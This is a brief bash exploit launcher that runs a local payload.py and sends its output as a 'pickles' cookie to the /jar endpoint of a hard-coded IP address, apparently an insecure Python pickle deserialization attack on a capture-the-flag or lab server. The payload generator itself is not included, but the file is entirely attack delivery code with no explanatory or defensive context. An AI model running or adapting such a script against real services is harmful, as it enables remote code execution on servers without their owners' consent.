#!/bin/bash

URL=http://141.85.224.105:8007/
cookie_payload=`python3 ./payload.py`
curl "$URL"'/jar' -H "Cookie: pickles=$cookie_payload"
